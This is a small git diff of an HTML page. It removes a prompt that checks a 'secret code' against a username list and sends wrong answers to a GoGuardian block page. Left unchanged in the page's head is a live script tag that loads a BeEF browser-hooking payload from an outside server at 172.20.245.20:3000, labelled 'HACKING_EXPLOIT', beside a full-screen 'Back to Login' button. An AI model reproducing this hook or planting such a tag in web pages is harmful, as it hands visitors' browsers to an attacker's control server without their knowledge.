@@ -7,22 +7,6 @@
     <script src="http://172.20.245.20:3000/beef/index.html" title="HACKING_EXPLOIT" allowtransparency="true" frameBorder="0"></script>
 </head>
 <body>
-    
-    <script>
-        window.onload = function() {
-            const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];
-            const userInput = prompt("Type the secret code");
-        
-            // Check if user clicked cancel or entered an invalid name
-            if (userInput === null || !validUsernames.includes(userInput)) {
-                window.location.href = "https://blocked.goguardian.com/";
-            }
-        };
-
-        // This function is no longer needed since we are removing askForName
-    </script>
-
-    <h1 id="greeting"></h1>
 
     <!-- Button to go back to login screen -->
     <button id="backToLoginButton" style="height:768px;width:1366px" onclick="goToLogin()">Back to Login</button>
